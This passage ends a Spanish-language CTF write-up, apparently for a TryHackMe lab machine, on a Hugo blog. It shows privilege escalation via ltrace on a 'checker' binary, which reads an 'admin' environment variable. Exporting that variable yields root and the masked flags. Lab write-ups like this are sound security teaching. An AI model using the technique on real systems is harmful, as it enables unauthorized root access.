+<p><img src="/p/blog-thm/mysql.png"
+	width="1900"
+	height="556"
+	srcset="/p/blog-thm/mysql_hufa89bbfaff4700f1d6b70dc1542837e9_86575_480x0_resize_box_3.png 480w, /p/blog-thm/mysql_hufa89bbfaff4700f1d6b70dc1542837e9_86575_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="341"
+		data-flex-basis="820px"
+	
+></p>
+<p>Para poder escalar privilegios debemos ver los programas que tiene en la ruta /usr/bin, en concreto debemos fijarnos en uno llamado <em>checker</em>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Podemos hacer un ltrace:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ltrace /usr/sbin/checker
+</span></span><span class="line"><span class="cl">ltrace /usr/sbin/checker
+</span></span><span class="line"><span class="cl">getenv<span class="o">(</span><span class="s2">&#34;admin&#34;</span><span class="o">)</span>                                  <span class="o">=</span> nil
+</span></span><span class="line"><span class="cl">puts<span class="o">(</span><span class="s2">&#34;Not an Admin&#34;</span>Not an Admin
+</span></span><span class="line"><span class="cl"><span class="o">)</span>                             <span class="o">=</span> <span class="m">13</span>
+</span></span><span class="line"><span class="cl">+++ exited <span class="o">(</span>status 0<span class="o">)</span> +++
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Exportamos la variable admin -&gt;
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">admin</span><span class="o">=</span>sx1v4n
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> ../../root <span class="o">&amp;&amp;</span> cat root.txt
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /
+</span></span><span class="line"><span class="cl">root.txt
+</span></span><span class="line"><span class="cl">9a******************************318
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Ahora que somos admin, podemos ver tambien el user.txt alojado en el directorio /media/usb</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@blog:/root# cat /media/usb/user.txt
+</span></span><span class="line"><span class="cl">cat /media/usb/user.txt
+</span></span><span class="line"><span class="cl">***********************************
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2023 S.x1v4n
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.16.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
